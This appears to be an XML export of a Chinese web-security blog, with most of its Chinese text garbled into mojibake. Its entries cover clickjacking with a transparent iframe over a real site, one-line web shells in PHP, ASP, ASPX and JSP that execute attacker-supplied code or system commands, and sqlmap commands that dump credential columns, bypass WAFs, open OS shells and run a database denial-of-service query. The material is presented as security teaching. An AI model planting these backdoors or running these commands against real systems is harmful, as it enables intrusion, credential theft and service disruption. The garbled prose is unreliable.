åˆ†æåŸç†é‚£é‡Œé¢æ¶æ„çš„ç½‘ç«™æ˜¯æ€ä¹ˆåšçš„å‘¢ï¼Ÿ æ­£å¸¸æƒ…å†µä¸‹ï¼šé€šå¸¸Cookieä¸­ä¼šå­˜æ”¾ç”¨æˆ·å‡­è¯ä¿¡æ¯æµè§ˆå™¨åœ¨å‘é€ä»»ä½•è¯·æ±‚æ—¶éƒ½ä¼šå¸¦ä¸Šå·²æœ‰çš„cookieé€šè¿‡cookieè¯†åˆ«ç”¨æˆ·èº«ä»½åï¼Œæ‰§è¡Œè½¬è´¦æ“ä½œã€‚ é»‘å®¢çš„æ“ä½œï¼šä¼ªé€ æ”»å‡»ä»£ç ï¼Œæ‰“å¼€é¡µé¢æ—¶è‡ªåŠ¨å®Œæˆè½¬è´¦]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Clickjacking(ç‚¹å‡»åŠ«æŒ)]]></title>
    <url>%2F2019%2F03%2F06%2FClickjacking%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å‰ç½®çŸ¥è¯†é¦–å…ˆä»‹ç»ä¸‹htmlä¸‹çš„iframeæ ‡ç­¾çš„ä½œç”¨ï¼šå¯ä»¥åˆ›å»ºåŒ…å«å¦ä¸€ä¸ªæ–‡æ¡£çš„å†…è”æ¡†æ¶ã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä»£ç ã€‚è¿è¡Œä¸‹é¢è¿™ä¸ªç½‘é¡µï¼Œå‘ç°ä»–å’Œç½‘æ˜“å®‰å…¨ä¸­å¿ƒçš„é¡µé¢å‡ ä¹ä¸€æ ·ï¼Œé™¤äº†urlä¸ä¸€æ · &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;ç½‘æ˜“å®‰å…¨ä¸­å¿ƒ&lt;/title&gt; &lt;style &gt; html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; æ¡ˆä¾‹ï¼Œå›¾ç‰‡çš„èƒŒåæ˜¯éšè—çš„ç½‘ç«™ã€‚ äºŒã€ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒå‘¢é€šè¿‡è¦†ç›–ä¸å¯è§çš„æ¡†æ¶è¯¯å¯¼å—å®³è€…ç‚¹å‡»è€Œé€ æˆçš„æ”»å‡»è¡Œä¸ºã€‚ ä¸‰ã€ç‚¹å‡»åŠ«æŒçš„ç‰¹ç‚¹1ã€éšè”½æ€§é«˜ 2ã€éª—å–ç”¨æˆ·æ“ä½œ 3ã€UI-è¦†ç›–æ”»å‡» 4ã€åˆ©ç”¨äº†iframeæ ‡ç­¾æˆ–è€…å…¶ä»–æ ‡ç­¾çš„å±æ€§ å››ã€å®ä¾‹åˆ†æä»£ç å¦‚ä¸‹ï¼Œæ•ˆæœå¦‚ä¸‹ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;ç‚¹å‡»åŠ«æŒ&lt;/title&gt; &lt;style &gt; /*è®¾ç½®é«˜åº¦ã€å®½åº¦*/ html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } /*è®¾ç½®éšè—ç½‘é¡µçš„å¯è§åº¦*/ iframe{ /*opacity: 0;*/ filter: alpha(opacity=0);/*IE*/ -moz-opacity:0.5;/*Moz+FF*/ opacity: 0.5;/*æ”¯æŒcss3æµè§ˆå™¨ï¼ˆFF1.5ä¹Ÿæ”¯æŒï¼‰*/ position: absolute; z-index: 2;/*ç½‘é¡µçš„å †å å±‚æ¬¡*/ } /*è®¾ç½®æŒ‰é’®çš„ä½ç½®*/ button{ position: absolute; top: -70px; left: 800px; z-index: 1; width: 72px; height: 26px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;&lt;img src=&quot;3.jpg&quot;&gt;&lt;/button&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; å†åšæ¬¡ä¿®æ”¹æ•ˆæœï¼Œä»¥åŠå®Œå…¨çœ‹ä¸å‡ºèƒŒåçš„ç½‘æ˜“ç½‘é¡µäº†ã€‚]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[URLè·³è½¬ã€å‘½ä»¤æ³¨å…¥ã€æ–‡ä»¶æ“ä½œç±»æ¼æ´ä»‹ç»]]></title>
    <url>%2F2019%2F03%2F06%2FURL%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ä»€ä¹ˆæ˜¯URLè·³è½¬æ¼æ´å‘¢å€ŸåŠ©æœªéªŒè¯çš„URLè·³è½¬ï¼Œå°†åº”ç”¨ç¨‹åºå¼•å¯¼åˆ°ä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹åŒºåŸŸï¼Œä»è€Œå¯¼è‡´çš„å®‰å…¨é—®é¢˜ã€‚ äºŒã€å®ç°æ–¹å¼1ã€Headerå¤´è·³è½¬å®ç°ä»£ç 2ã€javascriptè·³è½¬å®ç°ä»£ç 3ã€metaè·³è½¬ ä¸‰ã€åŸç†åˆ†æ å››ã€ä»€ä¹ˆæ˜¯å‘½ä»¤æ³¨å…¥ç³»ç»Ÿå‘½ä»¤æ³¨å…¥ äº”ã€webåº”ç”¨å¦‚ä½•æ³¨å…¥å‘½ä»¤PHPæ‰§è¡Œå‘½ä»¤çš„æ³¨å…¥ä¾‹å¦‚åˆ†ææ”»å‡»è¿‡ç¨‹ å…­ã€å¸¸è§çš„æ–‡ä»¶æ“ä½œ ä¸ƒã€å¸¸è§çš„æ–‡ä»¶æ“ä½œæ¼æ´1ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´2ã€ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´3ã€æ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶åŒ…å«æ¼æ´åŒ…æ‹¬æœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[browser]]></title>
    <url>%2F2019%2F03%2F06%2Fbrowser%2F</url>
    <content type="text"><![CDATA[Â·æµè§ˆå™¨å®‰å…¨æ€§ç‰¹æ€§ ä¸€ã€ä»‹ç»chromeæµè§ˆå™¨1ã€å¦‚ä½•ä¿®æ”¹å®‰å…¨è®¾ç½®ï¼Ÿå¸¸è§„è®¾ç½®æ­¥éª¤å¿«æ·è®¾ç½®æ­¥éª¤2ã€å¦‚ä½•æ¸…é™¤ç¼“å­˜3ã€æ¯ä¸€æ¬¡éƒ½å»æ¸…é™¤ç¼“å­˜å¤ªéº»çƒ¦äº†ï¼Œå¯ä»¥ä½¿ç”¨éšèº«æ¨¡å¼ï¼ˆæ— ç—•æ¨¡å¼ï¼‰ åœ¨åŠŸèƒ½èœå•ä¸­é€‰æ‹©æ–°å»ºæ— ç—•çª—å£å³å¯3ã€å¦‚ä½•æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘¢ï¼Ÿ4ã€å¦‚ä½•æŸ¥çœ‹DOMå…ƒç´ ï¼ŸF12ç›´æ¥æ‰“å¼€ä¸‹é¢çš„å¼€å‘è€…å·¥å…·æ 5ã€å¦‚ä½•æŸ¥çœ‹ç½‘ç»œæ•°æ®åŒ… äºŒã€ä»‹ç»ç«ç‹æµè§ˆå™¨ç«ç‹æµè§ˆå™¨æœ‰ä¸ªå¼ºå¤§çš„æ’ä»¶åº“1ã€å¦‚ä½•ä¿®æ”¹å®‰å…¨è®¾ç½® ä¸‰ã€ä»‹ç»IEæµè§ˆå™¨å¦‚ä½•ä¿®æ”¹å®‰å…¨è®¾ç½®]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è„šæœ¬æœ¨é©¬çš„åˆ¶ä½œä¸åŸç†(ä¸»è¦ä»‹ç»ä¸€å¥è¯æœ¨é©¬)]]></title>
    <url>%2F2019%2F03%2F03%2Fmuma%2F</url>
    <content type="text"><![CDATA[webshellï¼ˆwebåé—¨ï¼‰ä¸€ã€ä¸€å¥è¯æœ¨é©¬çŸ­å°ç²¾æ‚ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œéšè”½æ€§å¥½ã€‚ &lt;% execute request(&quot;value&quot;) %&gt; è¯´æ˜ï¼šä½¿ç”¨requestçš„è¯ï¼Œpostå’Œgetä¸¤ä¸­æ–¹å¼ä¼ æ¥çš„æ•°æ®éƒ½å¯ä»¥æ¥å—ã€‚ executeç”¨æ¥æ‰§è¡Œå®¢æˆ·ç«¯ä¼ æ¥çš„æ•°æ®ã€‚ ä»£ç æœ¬èº«æ²¡æœ‰å±å®³ï¼Œå…³é”®åœ¨äºæˆ‘ä»¬ä¼ è¾“çš„æ•°æ®æ˜¯ä»€ä¹ˆã€‚ å¸¸è§å†™æ³•aspä¸€å¥è¯æœ¨é©¬ &lt;%eval request(&quot;c&quot;)%&gt; phpä¸€å¥è¯æœ¨é©¬ &lt;?php @eval($_POST[â€˜valueâ€™]);?&gt; aspxä¸€å¥è¯æœ¨é©¬ &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.ltem[&quot;value&quot;])%&gt; jspä¸€å¥è¯æœ¨é©¬ &lt; % if(request.getParametere(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;)))write(request.getParameter(&quot;t&quot;).getBytes());% &gt; åˆ©ç”¨ä¸­å›½èœåˆ€è¿›è¡Œè¿æ¥è¿™è¾¹æˆ‘ç”¨phpstudyåšæ¼”ç¤ºï¼Œéœ€è¦æŠŠä¸€å¥è¯æœ¨é©¬æ–‡ä»¶æ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ã€‚ä¸€å¥è¯æœ¨é©¬å†…å®¹ä¸º &lt;?php @eval($_REQUEST[&apos;xx&apos;]); ?&gt; å¯ä»¥æ‰‹åŠ¨è·å–ä¿¡æ¯æˆ‘ä»¬æŠŠä¸€å¥è¯æœ¨é©¬å†…å®¹æ”¹æˆ &lt;?php @system($_REQUEST[&apos;xx&apos;]); ?&gt; è¿™æ ·å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚æ³¨æ„å†æ¬¡ä½¿ç”¨ä¸­å›½èœåˆ€è¿æ¥å…¶ä»–é“¾æ¥ä¹‹å‰ï¼Œéœ€è¦é‡ç½®ä¸‹ç¼“å­˜ã€‚åœ¨æµè§ˆå™¨è¾“å…¥ http://localhost/123.php?xx=ipconfig æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œä¸Šä¼ åˆ°æœåŠ¡å™¨åä¸èƒ½ç›´æ¥æ‰§è¡Œï¼Œå¾—æƒ³åŠæ³•æ”¹æˆè„šæœ¬æ ¼å¼æˆ–è€…åœ¨ç‰¹å®šç¯å¢ƒä¸‹ä»¥è„šæœ¬è¿è¡Œ ä¸€å¥è¯ä½¿ç”¨æŠ€å·§ äºŒã€å°é©¬ã€å¤§é©¬è¿˜æœ‰å…¶ä»–æœ¨é©¬ï¼Œå¦‚æ‰“åŒ…é©¬ã€è„±è£¤é©¬ç­‰ç­‰]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptåŸºç¡€]]></title>
    <url>%2F2019%2F03%2F03%2Fjs%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è¿°JavaScript æ˜¯äº’è”ç½‘ä¸Šæœ€å—æ¬¢è¿çš„ç¼–ç¨‹è¯­è¨€ä¹‹ä¸€ï¼Œç”¨äºä¸ºç½‘é¡µæ·»åŠ äº¤äº’æ€§ï¼Œå¤„ç†æ•°æ®ï¼Œä»¥åŠåˆ›å»ºå„ç§åº”ç”¨ç¨‹åºï¼ˆç§»åŠ¨åº”ç”¨ç¨‹åºï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºï¼Œæ¸¸æˆç­‰ï¼‰,è¿™é—¨è¯­è¨€å¯ç”¨äº HTML å’Œ webï¼Œæ›´å¯å¹¿æ³›ç”¨äºæœåŠ¡å™¨ã€PCã€ç¬”è®°æœ¬ç”µè„‘ã€å¹³æ¿ç”µè„‘å’Œæ™ºèƒ½æ‰‹æœºç­‰è®¾å¤‡ã€‚ äºŒã€ç”¨æ³•åœ¨htmlä¸­å¿…é¡»å†™åœ¨&lt;script&gt;&lt;/script&gt;ä¸­å†™å…¥jsä»£ç ã€‚åœ¨ç½‘é¡µä¸­é€šå¸¸é€šè¿‡headå’Œbodyå¢åŠ javascriptã€‚ äºŒã€åŸºç¡€è¯­æ³•1ã€javaScriptçš„è¾“å‡º ä½¿ç”¨doument.write()æ–¹æ³•å°†å†…å®¹å†™åˆ°htmlé¡µé¢ä¸­å¦‚ï¼š &lt;script&gt;document.write(&quot;hhhh&quot;) &lt;/script&gt; 2ã€window.alter()å¼¹å‡ºè­¦å‘Šæ¡† &lt;script&gt;window.alter(&quot;hhhh&quot;) &lt;/script&gt; 3ã€ç”¨innerHTMLå†™å…¥åˆ°htmlå…ƒç´ ä¸­ demoP.innerHTML=&quot;a=&quot;+a+&quot;,b=&quot;+b; 4ã€ä½¿ç”¨console.logï¼ˆï¼‰å†™å…¥åˆ°æµè§ˆå™¨çš„æ§åˆ¶å°ã€‚ 5ã€document.getElementById(â€œdemoâ€) æ˜¯ä½¿ç”¨ id å±æ€§æ¥æŸ¥æ‰¾ HTML å…ƒç´ çš„ JavaScript ä»£ç  ã€‚ 6ã€ innerHTML = â€œParagraph changed.â€ æ˜¯ç”¨äºä¿®æ”¹å…ƒç´ çš„ HTML å†…å®¹(innerHTML)çš„ JavaScript ä»£ç ã€‚ 7ã€æ ¼å¼åŒ–æ–‡æœ¬ä½¿ç”¨htmlæ ‡ç­¾æ¥æ ¼å¼åŒ–javascriptä¸­çš„æ–‡æœ¬å¦‚ï¼š &lt;script&gt; document.write(&quot;&lt;h1&gt;hello world&lt;/h1&gt;&quot;); &lt;/script&gt; 8ã€&lt; script &gt;æ ‡ç­¾languageå’Œtypeä¸¤ä¸ªå±æ€§ï¼ŒæŒ‡å®šè„šæœ¬ç±»å‹ &lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt; &lt;/script&gt; 9ã€å¤–éƒ¨javascriptåœ¨å¤šä¸ªä¸åŒç½‘é¡µä¸­ä½¿ç”¨ç›¸åŒçš„ä»£ç æ—¶ï¼Œå¤–éƒ¨è„šæœ¬æ˜¯å¾ˆå®ç”¨çš„ï¼Œjavascriptæ–‡ä»¶çš„æ–‡ä»¶åç¼€æ˜¯.jsã€‚è¦ä½¿ç”¨å¤–éƒ¨è„šæœ¬ï¼Œå°†è„šæœ¬æ–‡ä»¶çš„åç§°æ”¾åœ¨&lt; script &gt;æ ‡ç­¾çš„srcå±æ€§ä¸­ã€‚ &lt; script src=&quot;index.js&quot;&gt;&lt; /script &gt; æ³¨æ„ï¼šå¤–éƒ¨è„šæœ¬ä¸èƒ½ä½¿ç”¨&lt; script&gt;æ ‡ç­¾åŒ…è£¹ï¼Œå¯ä»¥åœ¨&lt; head&gt;æˆ–&lt; body&gt;ä¸­æ”¾ç½®å¤–éƒ¨è„šæœ¬å¼•ç”¨ï¼Œå°†javascriptæ”¾åœ¨å¤–éƒ¨æ–‡ä»¶ä¸­å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼šï¼ˆ1ï¼‰åˆ†ç¦»htmlå’Œä»£ç ã€‚ï¼ˆ2ï¼‰ä½¿htmlå’Œjavascriptæ›´å®¹æ˜“é˜…è¯»å’Œç»´æŠ¤ã€‚ï¼ˆ3ï¼‰ç¼“å­˜çš„javascriptæ–‡ä»¶å¯ä»¥åŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ã€‚ 10ã€jså˜é‡å£°æ˜ç”¨varæ¥å£°æ˜å˜é‡ï¼Œæ³¨æ„jsæ˜¯åŒºåˆ†å¤§å°å†™çš„ var x=5 å˜é‡å‘½åçš„è§„åˆ™ï¼ša.å˜é‡å¿…é¡»ä»¥å­—æ¯å¼€å¤´ã€‚b.å˜é‡ä¹Ÿèƒ½ä»¥$å’Œ_ç¬¦å·å¼€å¤´ï¼ˆä¸æ¨èï¼‰ã€‚c.å¤§å°å†™ä¸ä¸€æ ·ã€‚d.å˜é‡åç§°ä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚ 11ã€åŸºæœ¬æ•°æ®ç±»å‹åªæœ‰ä¸€ç§æ•°å­—ç±»å‹ï¼Œå¯ä»¥å¸¦å°æ•°ï¼Œä¹Ÿå¯ä»¥ä¸å¸¦ã€‚å¯ä»¥ä½¿ç”¨ç§‘å­¦è®°æ•°æ³•æ¥ä¹¦å†™ var y = 123e5 ;//&lt;!--12300000--&gt; var y = 123e-5 ;//&lt;!--0.00123--&gt; å­—ç¬¦ä¸²ï¼Œç”¨å•å¼•å·ã€åŒå¼•å·éƒ½å¯ä»¥ var pangzi = &quot;yang xiao pang&quot; ; var pangzi = &apos;yang xiao pang&apos; ; ä½†å¦‚æœæƒ³åœ¨å¼•å·ä¸­å†ä½¿ç”¨å¼•å·ï¼Œé¡»ä½¿ç”¨â€œ\â€è½¬æ„å¤„ç†å¼•å·ä¸­çš„å¼•å·ã€‚ï¼ˆå¦‚æœå¼•å·ç±»å‹ä¸åŒåˆ™ä¸ç”¨ï¼‰ var p= &quot;y \&quot;xiao p\&quot;&quot; ; var p = &apos;y \&apos;xiao p\&apos;&apos; ; 12ã€å¸ƒå°”ï¼šå½“å€¼ä¸º0ï¼Œnullï¼Œundefinedï¼Œç©ºå­—ç¬¦ä¸²æ—¶ï¼Œå¸ƒå°”å€¼ä¸ºfalseã€‚ä»»ä½•æ‹¥æœ‰å€¼çš„å­—ç¬¦ä¸²å…¶å¸ƒå°”å€¼ä¸ºtrueã€‚ 13ã€æ•°ç»„ &lt;script&gt; var fatty = new Array(); fatty[0] = &quot;æ¨å°èƒ–&quot;; fatty[1] = &quot;æ™¯å°èƒ–&quot;; document.write(fatty); &lt;/script&gt; æˆ– &lt;script&gt; var fatty = new Array(&quot;æ¨å°èƒ–&quot;,&quot;æ™¯å°èƒ–&quot;); document.write(fatty); &lt;/script&gt; 14ã€å¤æ‚æ•°æ®ç±»å‹**å¯¹è±¡ var fatty = {firstname = &quot;yang&quot;,lastname=&quot;yi&quot; ,id:1209ï½; å¯¹è±¡çš„ä¸¤ç§å¯»å€æ–¹å¼ï¼š name = person.lastname; name = person[&quot;lasrname&quot;]; å£°æ˜å˜é‡ç±»å‹ï¼šç”¨newå£°æ˜ var fatty = new String; æ³¨æ„javascriptå˜é‡å‡ä¸ºå¯¹è±¡ï¼Œå½“å£°æ˜ä¸€ä¸ªå˜é‡æ—¶ï¼Œå°±åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapå¸¸è§çš„11ç§æ–¹æ³•]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap2%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡è½¬è½½https://www.cnblogs.com/ichunqiu/p/5805108.htmlè¿™ç¯‡æ–‡ç« ä¸€å…±æœ‰11ç§å¸¸è§SQLmapä½¿ç”¨æ–¹æ³•ï¼š ä¸€ã€SQLMAPç”¨äºAccessæ•°æ®åº“æ³¨å…¥ (1) çŒœè§£æ˜¯å¦èƒ½æ³¨å…¥12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; Linux : .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; (2) çŒœè§£è¡¨ 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables (3) æ ¹æ®çŒœè§£çš„è¡¨è¿›è¡ŒçŒœè§£è¡¨çš„å­—æ®µ(å‡å¦‚é€šè¿‡2å¾—åˆ°äº†adminè¿™ä¸ªè¡¨) 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin (4) æ ¹æ®å­—æ®µçŒœè§£å†…å®¹(å‡å¦‚é€šè¿‡3å¾—åˆ°å­—æ®µä¸ºusernameå’Œpassword) 123 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot; Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,[url=]B[/url]password&quot; äºŒã€SQLMAPç”¨äºCookieæ³¨å…¥ (1) cookieæ³¨å…¥ï¼ŒçŒœè§£è¡¨ 1 win : python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2 (2) çŒœè§£å­—æ®µï¼Œ(é€šè¿‡1çš„è¡¨çŒœè§£å­—æ®µï¼Œå‡å¦‚è¡¨ä¸ºadmin) 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2 (3) çŒœè§£å†…å®¹ 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T admin -C &quot;username,password&quot; --level 2 ä¸‰ã€SQLMAPç”¨äºmysqlä¸­DDOSæ”»å‡»(1) è·å–ä¸€ä¸ªShell 1234 win: python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell Linux: sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell (2) è¾“å…¥æ‰§è¡Œè¯­å¥å®ŒæˆDDOSæ”»å‡» 1 select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f) å››ã€SQLMAPç”¨äºmysqlæ³¨å…¥ (1) æŸ¥æ‰¾æ•°æ®åº“ 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs (2) é€šè¿‡ç¬¬ä¸€æ­¥çš„æ•°æ®åº“æŸ¥æ‰¾è¡¨(å‡å¦‚æ•°æ®åº“åä¸ºdataname) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables (3) é€šè¿‡2ä¸­çš„è¡¨å¾—å‡ºåˆ—å(å‡å¦‚è¡¨ä¸ºtable_name) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns (4) è·å–å­—æ®µçš„å€¼(å‡å¦‚æ‰«æå‡ºid,user,passwordå­—æ®µ) 12 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump äº”ã€SQLMAPä¸­postç™»é™†æ¡†æ³¨å…¥ (1) å…¶ä¸­çš„search-test.txtæ˜¯é€šè¿‡æŠ“åŒ…å·¥å…·burp suiteæŠ“åˆ°çš„åŒ…å¹¶æŠŠæ•°æ®ä¿å­˜ä¸ºè¿™ä¸ªtxtæ–‡ä»¶æˆ‘ä»¬åœ¨ä½¿ç”¨Sqlmapè¿›è¡Œpostå‹æ³¨å…¥æ—¶ï¼Œç»å¸¸ä¼šå‡ºç°è¯·æ±‚é—æ¼å¯¼è‡´æ³¨å…¥å¤±è´¥çš„æƒ…å†µã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªå°æŠ€å·§ï¼Œå³ç»“åˆburpsuiteæ¥ä½¿ç”¨sqlmapï¼Œç”¨è¿™ç§æ–¹æ³•è¿›è¡Œpostæ³¨å…¥æµ‹è¯•ä¼šæ›´å‡†ç¡®ï¼Œæ“ä½œèµ·æ¥ä¹Ÿéå¸¸å®¹æ˜“ã€‚ æµè§ˆå™¨æ‰“å¼€ç›®æ ‡åœ°å€http:// www.xxx.com /Login.asp é…ç½®burpä»£ç†(127.0.0.1:8080)ä»¥æ‹¦æˆªè¯·æ±‚ ç‚¹å‡»loginè¡¨å•çš„submitæŒ‰é’® è¿™æ—¶å€™Burpä¼šæ‹¦æˆªåˆ°äº†æˆ‘ä»¬çš„ç™»å½•POSTè¯·æ±‚ æŠŠè¿™ä¸ªpostè¯·æ±‚å¤åˆ¶ä¸ºtxt, æˆ‘è¿™å‘½åä¸ºsearch-test.txt ç„¶åæŠŠå®ƒæ”¾è‡³sqlmapç›®å½•ä¸‹ è¿è¡Œsqlmapå¹¶ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1./sqlmap.py -r search-test.txt -p tfUPass è¿™é‡Œå‚æ•°-r æ˜¯è®©sqlmapåŠ è½½æˆ‘ä»¬çš„postè¯·æ±‚rsearch-test.txtï¼Œè€Œ-p å¤§å®¶åº”è¯¥æ¯”è¾ƒç†Ÿæ‚‰ï¼ŒæŒ‡å®šæ³¨å…¥ç”¨çš„å‚æ•°ã€‚ æ³¨å…¥ç‚¹ï¼šhttp://testasp.vulnweb.com/Login.asp å‡ ç§æ³¨å…¥æ–¹å¼ï¼š./sqlmap.py -r search-test.txt -p tfUPass (2) è‡ªåŠ¨çš„æœç´¢ 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] â€“forms (3) æŒ‡å®šå‚æ•°æœç´¢ 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] â€“data â€œtfUName=321&amp;tfUPass=321â€ å…­ã€SQLMAPä¸­Googleæœç´¢æ³¨å…¥ inurlåé¢çš„è¯­è¨€æ˜¯ç”±è‡ªå·±å®šçš„ æ³¨å…¥è¿‡ç¨‹ä¸­å¦‚æœé€‰yæ˜¯æ³¨å…¥ï¼Œå¦‚æœä¸æ˜¯é€‰n 1sqlmap -g inurl:php?id= ä¸ƒã€SQLMAPä¸­çš„è¯·æ±‚å»¶è¿Ÿå‚æ•° â€“delay â€“safe-freq 12python sqlmap.py â€“dbs -u â€œhttp://xxx.cn/index.php/Index/view/id/40.html&quot; â€“delay 1python sqlmap.py â€“dbs -u â€œhttp://xxx.cn/index.php/Index/view/id/40.html&quot; â€“safe-freq 3 å‚æ•° å…«ã€SQLMAPç»•è¿‡WAFé˜²ç«å¢™æ³¨å…¥ç‚¹:http://192.168.159.1/news.php?id=1 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 â€“dbs â€“batch â€“tamper â€œspace2morehash.pyâ€ space2morehash.pyä¸­å¯ä»¥æ›¿æ¢space2hash.pyæˆ–è€…base64encode.pyæˆ–è€…charencode.py éƒ½æ˜¯ç¼–ç æ–¹å¼ space2hash.py base64encode.py charencode.py ä¹ã€SQLMAPæŸ¥çœ‹æƒé™ 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] â€“privileges åã€SQLMAPä¼ªé™æ€æ³¨å…¥(1) æŸ¥æ‰¾æ•°æ®åº“ 1python sqlmap.py -u â€œhttp://xxx.cn/index.php/Index/view/id/40.html&quot; â€“dbs (2) é€šè¿‡1ä¸­çš„æ•°æ®åº“æŸ¥æ‰¾å¯¹åº”çš„è¡¨ (å‡å¦‚é€šè¿‡1ï¼Œå¾—åˆ°çš„æ˜¯dataname) 1python sqlmap.py -u â€œhttp://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname â€“tables (3) é€šè¿‡2ä¸­çš„æ•°æ®è¡¨å¾—åˆ°å­—æ®µ(å‡å¦‚å¾—åˆ°çš„æ˜¯tablenameè¡¨) 12python sqlmap.py -u â€œhttp://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename â€“columns (4) é€šè¿‡3å¾—åˆ°å­—æ®µå€¼(å‡å¦‚ä»3ä¸­å¾—åˆ°å­—æ®µidï¼Œpassword) 12python sqlmap.py -u â€œhttp://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename -C â€œpasswordâ€ â€“dump åä¸€ã€SQLMAPæ³¨å…¥ç‚¹æ‰§è¡Œå‘½ä»¤ä¸äº¤äº’å†™shell (1) æ³¨å…¥ç‚¹ï¼šhttp://192.168.159.1/news.php?id=1 æ­¤å¤„é‡‡ç”¨çš„æ˜¯Linuxç³»ç»Ÿ 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] â€“os-cmd=ipconfig å‡ºç°è¯­è¨€çš„é€‰æ‹©æ ¹æ®å®é™…çš„æµ‹è¯•ç½‘ç«™é€‰æ‹©è¯­è¨€ æŒ‡å®šç›®æ ‡ç«™ç‚¹D:/www/ (2) è·å–Shell 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] â€“os-shell å‡ºç°è¯­è¨€çš„é€‰æ‹©æ ¹æ®å®é™…çš„æµ‹è¯•ç½‘ç«™é€‰æ‹©è¯­è¨€ 